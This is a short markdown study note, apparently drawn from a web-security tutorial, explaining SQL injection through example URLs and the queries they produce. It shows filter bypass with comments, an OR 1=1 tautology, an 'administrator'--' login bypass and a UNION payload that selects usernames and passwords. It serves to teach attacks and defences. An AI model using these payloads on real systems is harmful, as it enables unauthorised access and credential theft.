# SQL injection examples

- Retrieving hidden data

* Subverting application logic
* UNION attacks
* Examining the database
* Blind SQL injection

## Retrieving hidden data

```
https://insecure-website.com/products?category=Gifts
```

This results in the SQL query:

```sql
SELECT * FROM products WHERE category = 'Gifts' AND released = 1
```

> The restriction `released = 1` is being used to hide products that are not released. For unreleased products, presumably `released = 0`.

---

### step1

an attacker can construct an attack like:

```
https://insecure-website.com/products?category=Gifts'--
```

This results in the SQL query:

```sql
SELECT * FROM products WHERE category = 'Gifts'--' AND released = 1
```

The key thing here is that the double-dash sequence `--` is a comment indicator in SQL, and means that the rest of the query is interpreted as a comment.
so it no longer includes `AND released = 1`

---

### step2

an attacker can cause the application to display all the products in any category, including categories that they don't know about:

```
https://insecure-website.com/products?category=Gifts'+OR+1=1--
```

This results in the SQL query:

```sql
SELECT * FROM products WHERE category = 'Gifts' OR 1=1--' AND released = 1
```

category is Gifts, or 1 is equal to 1. Since `1=1` is always true, the query will return all items.

## Subverting application logic

Consider an application that lets users log in with a username and password.
If a user submits the username `wiener` and the password `bluecheese`, the application checks the credentials by performing the following SQL query:

```sql
SELECT * FROM users WHERE username = 'wiener' AND password = 'bluecheese'

```

If the query returns the details of a user, then the login is successful. Otherwise, it is rejected.
Here, an attacker can log in as any user without a password simply by using the SQL comment sequence `--` to remove the password check from the `WHERE` clause of the query. For example, submitting the username `administrator'--` and a blank password results in the following query:

```sql
SELECT * FROM users WHERE username = 'administrator'--' AND password = ''
```

## Retrieving data from other database tables

```sql
SELECT name, description FROM products WHERE category = 'Gifts'
```

attacker modify sql command

```sql
' UNION SELECT username, password FROM users--
```

## Read more

[[2_sql_union_attack)
